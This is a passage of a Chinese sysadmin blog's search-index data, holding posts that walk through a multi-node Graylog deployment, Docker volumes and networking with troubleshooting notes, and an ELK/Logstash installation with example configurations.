","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:6:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","运维记事"],"content":"Graylog多节点部署","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"以下记录下graylog多节点部署的过程。附带一个几个日志搜集的配置方法。 此次部署是也是采用dokcer加物理机器混合部署的，各个核心组件均为两个节点。 mongodb集群说的是至少需要3个节点才算是对的，不过这块我也不是很懂，我就只处理了两个节点，另外为什么用docker混合部署，因为mongodb我特么在服务器上直接安装搞不定(所有搞不定的我都会用docker混用！)。这两个问题有了解的希望能指导一下(TODO:应该没有人回来逛我这个站吧，虽然如此，但还是要假装有人说一下的) ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:0:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"1. mongo 集群分片配置(docker) 创建每个成员要使用的副本集密钥文件 $\u003e mkdir -p /data/docker/mongodb \u0026\u0026 cd /data/docker/mongodb $\u003e mkdir .keyfile $\u003e cd .keyfile $\u003e openssl rand -base64 746 \u003e mongodb-keyfile $\u003e chmod 600 mongodb-keyfile $\u003e cd .. $\u003e chown -R 999.999 .keyfile # 999 是为docker内部的mongo用户及其组id mongodb docker-compose 配置文件(分发到每个节点上面,包含第一步生成的密钥文件) 保存并修改以下数据 version: '2' services: # MongoDB: https://hub.docker.com/_/mongo/ mongodb: image: mongo:3 volumes: - /data/docker/mongodb/.keyfile:/data/keyfile:ro - /data/docker/mongodb/db:/data/db - /etc/localtime:/etc/localtime:ro environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: \u003cpasswd\u003e command: mongod --auth --keyFile /data/keyfile/mongodb-keyfile --bind_ip_all --wiredTigerCacheSizeGB 1.5 --replSet rs0 ports: - \"27017:27017\" networks: - mongodb networks: mongodb: driver: bridge 初始化副本集、创建用户、授权(一个节点上执行就可以了) $\u003e docker exec -it mongodb_mongodb_1 bash rs0:SECONDARY\u003e mongo -u root -p \u003cpasswd\u003e rs0:SECONDARY\u003e rs.initiate({_id : 'rs0',members: [{ _id : 0, host : \"192.16.10.200:27017\" },{ _id : 1, host : \"192.16.10.201:27017\" }]}) # 此处在后续测试中，两个节点处于非同一网段，或同一网关下出现过`no host described in new configuration 1 for replica set rs0 maps to this node docker`,但未解决，后来换到自己新建的测试机器又正常了 rs0:SECONDARY\u003e rs.status() rs0:SECONDARY\u003e use graylog rs0:PRIMARY\u003e db.createUser( { user: \"graylog\", pwd: \"JlQy8fKAvpPMfLAf\", roles: [ { role: \"readWrite\", db: \"graylog\" } ]}); Successfully added user: { \"user\" : \"graylog\", \"roles\" : [ { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.grantRolesToUser( \"graylog\" , [ { role: \"dbAdmin\", db: \"graylog\" } ]) rs0:PRIMARY\u003e show users { \"_id\" : \"graylog.graylog\", \"userId\" : UUID(\"94720c5f-ddca-4dfb-8252-57e84ba86280\"), \"user\" : \"graylog\", \"db\" : \"graylog\", \"roles\" : [ { \"role\" : \"dbAdmin\", \"db\" : \"graylog\" }, { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.auth(\"graylog\",\"JlQy8fKAvpPMfLAf\") 1 以上mongodb部署完成了。 ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:1:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"2. elasticserach 安装配置 导入elasticsearch-oss yum 源 ,安装 (多节点) $\u003e cat /etc/yum.repo.d/elasticsearch.repo [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/oss-6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md $\u003e yum install elasticsearch-oss -y # 注意安装jdk并导入环境变量 修改elasticsearch 配置文件以下参数 $\u003e grep \"^[a-Z]\" /etc/elasticsearch/elasticsearch.yml cluster.name: graylog # 集群名 node.name: es-node-01 # 节点名(节点名唯一，其他节点注意修改) network.host: 192.16.10.200 # 当前服务器IP discovery.zen.ping.unicast.hosts: [\"192.16.10.200\", \"192.16.10.201\"] # 各个节点 discovery.zen.minimum_master_nodes: 2 启动程序 # yum安装默认也是没有创建elasticsearch默认账号的，需要创建 $\u003e useradd -d /usr/share/elasticsearch -s /sbin/nologin elasticsearch $\u003e systemctl start elasticsearch.service $\u003e systemctl enable elasticsearch.service ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:2:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"3. graylog-server 安装配置 安装 $\u003e rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-2.2-repository_latest.rpm $\u003e sudo yum install graylog-server 修改配置文件 $\u003e vim /etc/graylog/server/server.conf is_master = true # 非主节点需要修改为false password_secret = \u003csecret\u003e # token ， 64位以上随机值，每个节点需要一致，运行中，不可修改 root_username = admin root_password_sha2 = \u003csha256\u003e # 登陆密码, sha256 加密 \u003cecho -n \"Enter Password: \" \u0026\u0026 head -1 \u003c/dev/stdin | tr -d '\\n' | sha256sum | cut -d\" \" -f1\u003e root_email = \u003cexample@mail.com\u003e # 主账号邮箱 root_timezone = Asia/Shanghai # 时区 http_bind_address = 192.16.10.200:9900 # http 代理访问地址,建议绑定网卡ip elasticsearch_hosts = http://192.16.10.200:9200,http://192.16.10.201:9200 # elasticsearch地址，多个逗号隔开 allow_highlighting = true # 搜索结果高亮，默认关闭状态，需要可打开 mongodb_uri = mongodb://graylog:JlQy8fKAvpPMfLAf@192.16.10.200:27017,192.16.10.201:27017/graylog?replicaSet=rs0 # mongodb地址，注意看格式 # transport_email_**** 邮件的相关配置，是前端用来配置告警用的，必须在这儿配置，不过我配置了打死生不了效 启动 $\u003e systemctl start graylog-server.service $\u003e systemctl enable graylog-server.service ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:3:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"4. 前端代理配置(nginx) 官方参考： https://docs.graylog.org/en/3.0/pages/configuration/web_interface.html#configuring-webif-nginx # upstream upstream graylog_server { ip_hash; server 192.16.10.200:9900 weight=2; server 192.16.10.201:9900 weight=1; } # location 模块 location /graylog/{ access_log logs/graylog.access.log main; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Forwarded-Server $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Graylog-Server-URL https://$server_name/graylog/; rewrite ^/graylog/(.*)$ /$1 break; proxy_pass http://graylog_server; } ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:4:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"5. 使用示例 本来是想写一些使用示例的，但似乎也没有什么好写的，官方的市场上有很多 nginx https://github.com/paulbarfuss/graylog3-content-pack-nginx-json 将此json导入到graylog中就可以了(System-Content Packs-Upload)，然后最好是自己创建根据这个模板自己创建一个(默认的会安装太多了，我个人是用不了那么多的)，当然也可以直接安装，然后给将文档配置nginx即可。 java java 我是直接让开发推送到graylog-server中的，这个同样可以在官方的市场中收到相关的开源插件的。 ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:5:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"6. 后记 个人非常建议尝试graylog-server 维护简单，没有ELK系列那么笨重。 支持多种传输,json自动格式化, 同时兼容ELK系列其他组件 ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:6:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"Docker进阶","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/","tags":["linux","docker"],"title":"Docker进阶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","运维记事"],"content":"volume(卷挂载) 与 bind mount (目录挂载) # 创建卷 [root@00 ~]# docker volume create docker_data docker_data # 查看已有卷 [root@00 ~]# docker volume ls DRIVER VOLUME NAME local docker_data # 产看卷详细信息 [root@00 ~]# docker volume inspect docker_data [ { \"CreatedAt\": \"2019-03-04T14:20:40+08:00\", \"Driver\": \"local\", \"Labels\": {}, \"Mountpoint\": \"/var/lib/docker/volumes/docker_data/_data\", \"Name\": \"docker_data\", \"Options\": {}, \"Scope\": \"local\" } ] # 挂载卷 # 当src值以非/开头时，如果不存在该名字的volume，则自动创建使用，存在则直接使用，若值以/开头，则使用对应当前操作系统对应目录进行挂载,不存在目录会抛出一个错误(但若使用-v参数，则会自动创建对应目录) # 另 volume，若volume为新建，当容器内挂载目录存在数据时，则会将数据挂载到volume中，而bind mount(目录挂载)则会清空容器内挂载目录。 # 若volume为非新建，volume中已经存在数据时，则会将容器内挂载目录数据隐藏并将volume的数据挂载进入容器内目录。 [root@00 ~]# docker run -td --name centos01 --mount src=docker_data,dst=/data centos # docker run -td --name centos01 --v docker_data:/data centos # docker run -td --name centos01 --mount type=bind,src=/data,dst=/data centos # docker run -td --name centos01 --v /data:/data centos 3efe72134d7c796db548f343e5a8b11436271b9bbea2a9b07c2f868257a47247 [root@00 ~]# docker exec -it centos01 ls -d /data /data [root@00 ~]# docker exec -it centos01 touch /data/test{1..4} [root@00 ~]# docker exec -it centos01 ls /data test1 test2 test3 test4 [root@00 ~]# ls -l /var/lib/docker/volumes/docker_data/_data/ 总用量 0 -rw-r--r--. 1 root root 0 3月 4 14:32 test1 -rw-r--r--. 1 root root 0 3月 4 14:32 test2 -rw-r--r--. 1 root root 0 3月 4 14:32 test3 -rw-r--r--. 1 root root 0 3月 4 14:32 test4 # 删除卷(只有删除卷的时候，卷中的数据才会被删除，删除容器不会删除卷数据) [root@00 ~]# docker volume rm docker_data ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/:1:0","tags":["linux","docker"],"title":"Docker进阶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","运维记事"],"content":"网络模式 bridge -net=bridge 默认网络，docker启动后创建一个docker0的网桥，默认创建容器也是添加到此网桥中 host -net=host 容器不会获得一个独立的网络空间，而是与宿主机共用一个,这就意味着容器不会有自己的网卡信息，而是使用宿主及的，容器除了网络，其他都是隔离的。 none -net=none 获取独立的网络空间，但不为容器进行任何网络配置，需要手动配置 container -net=container:name/id 与指定容器使用同一个网络空间，具有同样的网络配置信息，两个容器除了网络，其他都是隔离的。 自定义网络 与默认的bridge原理一样 ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/:2:0","tags":["linux","docker"],"title":"Docker进阶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","运维记事"],"content":"Docker运维故障记录","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"docker centos7 镜像 systemctl 报错 Failed to get D-Bus connection: Operation not permitted https://blog.csdn.net/xiaochonghao/article/details/64438246 docker run --privileged -itd -v /sys/fs/cgroup:/sys/fs/cgroup centos /usr/sbin/init ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:1:0","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"docker DOCKER-USER 规则链丢失 https://blog.csdn.net/Liv2005/article/details/112850208 https://docs.docker.com/network/iptables/ DOCKER-USER 是用于控制外部网络与 docker容器网络通信使用的，一般来说重置防火墙会删除所有的自定义规则链，所以重置后，iptables就不会在包含docker创建的那些规则链了。此时，只要主动重启docker服务就可以了。但是这样可能就会产生另一个问题，那就是DOCKER-USER规则链丢失，这个时候只需要主动创建一个网桥，然后删除就可以了(此问题处理可能会导致容器内网络无法正常访问外部网络，见下一个问题)。然后测试下容器内访问外部网络是否正常, 比如容器内需要连接远程数据库。 $\u003e docker network create net-host $\u003e docker network rm net-host ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:2:0","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"docker 容器内无法访问远程服务器网络 当前记录问题产生原因可能是由于上述的DOCKER-USER规则链丢失处理后而产生的新的问题，部署为docker-compose，解决先是down容器，然后重启docker，再重新up容器。后测试容器内网络访问正常。 ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:3:0","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"docker 网络桥联网络无法访问物理机网络问题 当容器以桥连模式启动时是无法访问物理主机网络的,此时需要手动配置下防火墙信任容器的桥连网卡流量 # 如容器启动后的网卡为 br-3630aa8a433b ,则防火墙添加下 $\u003e iptables -A INPUT -i br-3630aa8a433b -j ACCEPT ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:4:0","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Elk日志分析系统","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"elk日志收集系统，elasticsearch(存储+搜索)+logstash(收集)+kibana(展示)综合技术,简称elk 搭建环境: virtualbox5.1.26 centos 6.7 openjdk1.8 elasticsearch 2.x elasticsearch 部署需要安装jdk,openjdk和oraclejdk都可以,由于系统当中原来已经有openjdk了,我这儿就只把jdk升级了下 [root@11 ~]# yum install java-1.8.0-openjdk -y [root@11 ~]# java -version openjdk version \"1.8.0_141\" OpenJDK Runtime Environment (build 1.8.0_141-b16) OpenJDK 64-Bit Server VM (build 25.141-b16, mixed mode) ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Elasticsearch ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:1:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"安装方式： ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"下载并安装GPG key，添加elasticsearch源 [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/elasticsearch.repo [elasticsearch-2.x] name=Elasticsearch repository for 2.x packages baseurl=http://packages.elastic.co/elasticsearch/2.x/centos gpgcheck=1 gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:1","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"安装，并修改配置信息 [root@11 ~]# yum install -y elasticsearch #-------过程省略----------- [root@11 ~]# vim /etc/elasticsearch/elasticsearch.yml cluster.name: my-11 #集群标识符 node.name: 67-11 #节点名称（集群机器需要修改此节点名称） path.data: /data/es-data #数据存储的目录，这个目录的权限所属的用户和组为elasticsearch(多个逗号隔开) path.logs: /var/log/elasticsearch #日志文件位置 bootstrap.memory_lock: true #保证数据不会写入交换分区，生产环境建议打开，保证性能(可能会导致启动失败，失败时关闭) network.host: 172.16.67.11 #此参数配置的就是自己的ip，多个ip建议配置，默认0.0.0.0（集群机器需要修改此节点名称） http.port: 9200 #默认端口 #discovery.zen.ping.unicast.hosts: [\"172.16.67.11\", \"172.16.67.12\"] #集群配置项，elasticsearch分为组播和单播两种模式。组播所有集群机器的都在同一个组里面，单播 #表示让我们个告诉其他人，除了这台机器还有那些机器，一般默认就可以了（这个地方用virtualbox的nat网络模式作测试的时候，默认的组播模式是无法使用的，需要配置为单播 #模式），这儿可能对于这个组播和单播描述的不是很对，要想详细了解的，自己去查询相关资料吧。还有这个只需要有一台机器配置就可以了。 ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:2","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"启动elasticsearch [root@11 ~]# service elasticsearch start #yum安装的，如果这儿启动如果出现了什么问题，一般就是因为防火墙或者对应目录的权限， [root@11 ~]# netstat -lntp|grep java #elasticsearch 主要使用的就是这两个端口 tcp 0 0 ::ffff:172.16.67.11:9200 :::* LISTEN 30464/java tcp 0 0 ::ffff:172.16.67.11:9300 :::* LISTEN 30464/java ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:3","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"使用方式: elasticsearch 使用都是依赖插件，比较好用的有head、kopf [root@11 ~]# /usr/share/elasticsearch/bin/plugin install mobz/elasticsearch-head #主要是elasticsearch集群管理的插件 [root@11 ~]# /usr/share/elasticsearch/bin/plugin install lmenezes/elasticsearch-kopf #相对于head功能更全的一个管理插件 插件安装后，存入目录是在elasticsearch的插件目录 [root@11 ~]# ls -l /usr/share/elasticsearch/plugins/ 总用量 8 drwxr-xr-x. 6 root root 4096 8月 17 03:09 head drwxr-xr-x. 8 root root 4096 8月 17 03:12 kopf 浏览器访问：http://172.16.67.11:9200/_pulgin/head,http://172.16.67.11:9200/_pulgin/kopf 信息: 添加方式：点击‘复合查询’-‘查询’， 第一栏，实际就是你的ip+端口，这个是默认填写好了的。 第二栏，选择post,内容/index-demo/test 第三栏，实际就是一个json串，随便录入后提交就可以了，然后提交就可以了。 添加过后在重新刷新上述页面,就可以看到数据了,上图中的圈中,第一个代表的集群健康值,绿色代表健康,黄色代表警告-没有主分片丢失,红色代表存在数据丢失, 第二个 绿色代表分片,粗线代表主分片,西线代表副本分片. ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:4","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"集群 : 集群的话,配置就只需要改动下配置文件的节点名称,如果你是使用虚拟机模拟nat网络模式的主机,可能需要将主机模式更改为单波模式,这个前面有说明. ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:3:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"LogStash ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:4:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"安装方式: ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:5:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"下载并安装GPG key、添加yum仓库 [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/logstash.repo [logstash-2.3] name=Logstash repository for 2.3.x packages baseurl=https://packages.elastic.co/logstash/2.3/centos gpgcheck=1 gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:5:1","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"安装及测试 [root@11 ~]# yum install -y logstash #----------过程省略----------- #----------测试模块start----------- [root@11 ~]# /opt/logstash/bin/logstash -e \"input { stdin{} } output { stdout{codec =\u003e rubydebug} }\" # =\u003e 这儿表示的是等号；stdout {} 格式化输出到前台 Settings: Default pipeline workers: 4 Pipeline main started hello logstash #输入内容 { \"message\" =\u003e \"hello logstash\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T17:06:19.892Z\", \"host\" =\u003e \"11\" } [root@11 ~]# /opt/logstash/bin/logstash -e 'input { stdin{} } output { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } }' Settings: Default pipeline workers: 4 Pipeline main started haha # 读取并写入elasticsearch中,按照日期兴建索引,注意此处是不会打印的 123 # 若要既打印也输出,需要增加其他插件代码.如:output { stdout {} elasticsearch asdf # { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } } eeeeeeeee # # 访问 http://172.16.67.11:9200/_plugin/head 地址下的'数据浏览'查看是否添加成功 #----------测试模块end----------- ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:5:2","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"配置方式 注意/etc/logstash/conf.d 如果未指定配置文件，logstash默认会加载所有的配置文件 参考插件参数:https://www.elastic.co/guide/en/logstash/current/output-plugins.html elasticsearch 前台读取 [root@11 ~]# vim /etc/logstash/conf.d/demo.conf #/etc/logstash/conf.d 这个目录是可以被更改的,修改logstash的程序文件(/etc/init.d/logstash)对应的配置就可以了 #input 和output 都可以是多个 input { stdin {} } filter { } output { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } stdout { codec =\u003e rubydebug } } [root@11 ~]# /opt/logstash/bin/logstash -f /etc/logstash/conf.d/demo.conf # 测试配置文件 Settings: Default pipeline workers: 4 Pipeline main started ceshi { \"message\" =\u003e \"ceshi\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T18:08:22.003Z\", \"host\" =\u003e \"11\" } 66666666 { \"message\" =\u003e \"66666666\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T18:08:37.970Z\", \"host\" =\u003e \"11\" } # 同样的访问 http://172.16.67.11:9200/_plugin/head 地址下的'数据浏览'查看是否添加成功 elasticsearch 从文件读取 [root@11 ~]# vim /etc/logstash/conf.d/file.conf input { file { path =\u003e [\"/var/log/messages\",\"/var/log/secure\"] type =\u003e \"system-log\" start_position =\u003e \"beginning\" } } filter { } output { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"system-log-%{+YYYY.MM}\" } stdout { codec =\u003e rubydebug } } [root@11 ~]# /opt/logstash/bin/logstash -f /etc/logstash/conf.d/file.conf Settings: Default pipeline workers: 4 Pipeline main started { \"message\" =\u003e \"Aug 16 23:27:41 11 kernel: pid_max: default: 32768 minimum: 301\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T19:19:34.437Z\", \"path\" =\u003e \"/var/log/messages\", \"host\" =\u003e \"11\", \"type\" =\u003e \"system-log\" } #------省略很多很多数据------ #------ logstash if语法------ [root@11 ~]# vim /etc/logstash/conf.d/file.conf input { file { path =\u003e [\"/var/log/messages\",\"/var/log/secure\"] type =\u003e \"system-log\" start_position =\u003e \"beginning\" } file { path =\u003e \"/var/log/elasticsearch/myes.log\" type =\u003e \"es-log\" start_position =\u003e \"beginning\" } } filter { } output { if [type] == \"system-log\" { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"system-log-%{+YYYY.MM}\" } } if [type] == \"es-log\" { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"es-log-%{+YYYY.MM}\" } } } [root@11 ~]# /opt/logstash/bin/logstash -f /etc/logstash/conf.d/file.conf Settings: Default pipeline workers: 4 Pipeline main started #------省略很多很多数据------ #------multiline 逐行合并语法,当遇见正则表达式匹配规则的字符,就把前面所有的行全部合并起来--- #------------演示测试 start ------------------ [root@11 ~]# vim /etc/logstash/conf.d/codec.conf input { stdin { codec =\u003e multiline { pattern =\u003e \"^\\[\" #正则表达式 negate =\u003e true #合并上级菜单 what =\u003e \"previous\" # } } } filter { } output { stdout { codec =\u003e rubydebug } } [root@11 conf.d]# /opt/logstash/bin/logstash -f /etc/logstash/conf.d/codec.conf Settings: Default pipeline workers: 4 Pipeline main started [kjkjljlkjl kl;k;k;hj jlkjljl kkkhhh [ # 当匹配到以[开头时候,合并前面的全部内容 { \"@timestamp\" 